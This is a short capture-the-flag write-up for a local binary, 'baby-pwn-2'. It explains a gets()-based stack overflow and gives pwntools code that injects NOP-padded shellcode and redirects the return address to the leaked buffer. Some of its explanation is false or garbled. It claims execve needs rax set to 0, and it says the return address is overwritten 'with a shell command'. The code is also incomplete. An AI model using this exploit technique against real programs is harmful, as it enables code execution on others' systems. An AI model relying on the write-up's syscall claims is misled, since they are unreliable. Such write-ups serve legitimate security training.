The vulnerability lies in the use of the gets function, which does not check the length of the input. This allows an attacker to overflow the buffer and use shellcode to overwrite the return address with a shell command.

The leaked address shows where the buffer or return address is located in memory.

The shellcode can be found at https://shell-storm.org/. We add the `xor rax, rax` instruction to clear the `rax` register before calling the `execve` syscall. This is necessary because the `execve` syscall expects the `rax` register to be 0. Also, clear `rdx` because envp can be NULL.

There will be noops (`0x90`) in the shellcode to ensure that the shellcode is executed correctly. The payload will be the shellcode followed by more noops to fill the buffer, and then the address of the buffer/return address.

```py
from pwn import *
# Overwrite buffer + saved RBP + saved return address
payload = shellcode.ljust(64, asm('nop'))  # Inject shellcode at the start
payload += asm('nop') * 8  # Saved RBP padding
# Overwrite return address to point to the buffer
payload += p64(buffer_address)
```

Then we can send the payload to the program to get the flag.

```py
from pwn import *
p = process('./baby-pwn-2')
p.sendline(payload)
p.interactive()
```

The full script is in [solve.py](./solve.py).